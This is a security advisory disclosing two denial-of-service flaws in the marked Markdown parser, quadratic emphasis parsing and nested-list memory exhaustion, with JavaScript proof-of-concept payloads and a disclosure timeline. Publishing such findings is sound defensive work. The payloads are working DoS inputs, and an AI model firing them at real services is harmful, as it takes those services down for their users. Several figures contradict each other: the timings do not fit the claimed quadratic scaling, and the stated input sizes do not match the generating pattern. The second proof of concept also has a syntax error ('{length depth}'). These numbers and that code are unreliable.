# Marked ReDoS and OOM Vulnerabilities Quadratic Emphasis Parsing and Nested List Memory Exhaustion

## Overview
Marked version 17.0.4 and all current releases contain two algorithmic complexity issues that enable denial of service through specially crafted Markdown input.

1. The emphasis parser for bold and italic text demonstrates quadratic time complexity when processing unclosed delimiters.
2. The list tokenizer exhibits superlinear memory consumption when handling deeply nested lists, reaching amplification factors of approximately 496 times the input size.

Both issues can be triggered by payloads smaller than 50 KB and require no authentication. Any service that accepts and parses untrusted Markdown is exposed.

The findings were privately disclosed through a GitHub Security Advisory identified as GHSA-2j45-q7r7-rpfj. The project maintainer closed the advisory without publication and classified the behavior as an implementation concern belonging to the caller rather than a library vulnerability. GitHub documentation states that an advisory may be closed when sufficient information exists to conclude the reported issue does not constitute a security risk. The maintainer exercised that option and the responsible disclosure period has therefore concluded.

## Rationale for Classification as a Vulnerability
The observed behavior conflicts with the Secure by Default principle articulated by OWASP. A parsing library is expected to remain safe under normal use without forcing every caller to add external mitigations. Documentation alone does not constitute an effective security control.

The maintainer has recommended that consumers place parsing of untrusted Markdown inside web workers. Under that reasoning virtually no parsing library could ever be considered to contain a security defect because isolation could always be delegated to the caller.

Marked already carries two prior CVEs of the identical class
- CVE-2022-21680 covering ReDoS in heading parsing
- CVE-2022-21681 covering ReDoS in inline parsing

Both entries remain active in the National Vulnerability Database and have neither been revoked nor disputed. The present findings belong to the same category of defect, were reported through the same channel, and differ only in the maintainer’s current disposition toward formal recognition.

## Finding 1 Quadratic Emphasis Parsing (CWE-407)
The inline tokenizer maintains a list of candidate emphasis delimiters and repeatedly scans that list in reverse. When the input consists of a long sequence of unclosed openers of the form “*a ” repeated N times, every newly encountered opener must examine every preceding opener. The resulting work is quadratic in the length of the input.

Pattern used for measurement
“*a ”.repeat(N)

Observed timings on marked 17.0.4
- N equals 2000 (approximately 6 KB) finishes in roughly 0.8 ms
- N equals 4000 (approximately 12 KB) finishes in roughly 3 ms
- N equals 8000 (approximately 24 KB) finishes in roughly 12 ms
- N equals 16000 (approximately 48 KB) requires 35 to 38 seconds

Doubling the input length multiplies the elapsed time by a factor close to four, confirming quadratic scaling.

### Proof of Concept
```js
const { marked } = require('marked')
// 48 KB payload that consumes roughly 35 seconds on version 17.0.4
const payload = '*a '.repeat(16000)
console.time('parse')
marked.parse(payload)
console.timeEnd('parse')
```

## Finding 2 Nested List Memory Exhaustion (CWE-770)
Deeply nested unordered lists force the tokenizer to allocate nested token objects whose size grows superlinearly with nesting depth. Heap consumption quickly exceeds the size of the original input and can exhaust the JavaScript heap.

Pattern used for measurement
Array.from({length depth}, (_, i) => ' '.repeat(i) + '- item').join('\\n')

Observed memory consumption
- depth equals 500 (approximately 12.5 KB input) consumes roughly 50 MB of heap
- depth equals 750 (approximately 28 KB input) consumes roughly 172 MB of heap
- depth equals 1000 (approximately 500 KB input) produces an immediate out-of-memory crash

The failure mode is heap exhaustion rather than stack overflow. The process terminates with the message “JavaScript heap out of memory.”

### Proof of Concept
```js
const { marked } = require('marked')
// Payload of roughly 500 KB that triggers an out-of-memory crash
const depth = 1000
const payload = Array.from({length depth}, (_, i) =>
  ' '.repeat(i) + '- item'
).join('\\n')
console.log('input size', payload.length, 'bytes')
marked.parse(payload)
```

## Impact
Any server-side application that invokes marked on user-controlled Markdown is susceptible to denial of service. A 48 KB emphasis payload can occupy a single-threaded Node.js process for more than half a minute. A nested-list payload smaller than 500 KB is sufficient to crash the process entirely.

## Timeline
- 2026-03-04  Private report submitted via GitHub Security Advisory to the markedjs/marked repository
- 2026-03-05  Maintainer closed the advisory, asserting the issue was not a vulnerability and reflected unsafe caller implementation
- 2026-03-06  Technical counter-arguments and references to the earlier CVEs were supplied
- 2026-03-06  Maintainer restated the original position and noted that the prior CVEs predated the documentation of worker-based isolation
- 2026-03-06  Public disclosure followed because the advisory had been closed without publication, satisfying the disclosure obligation defined by GitHub policy

## Credit
The issues were discovered by vmfunc (github.com/vmfunc)
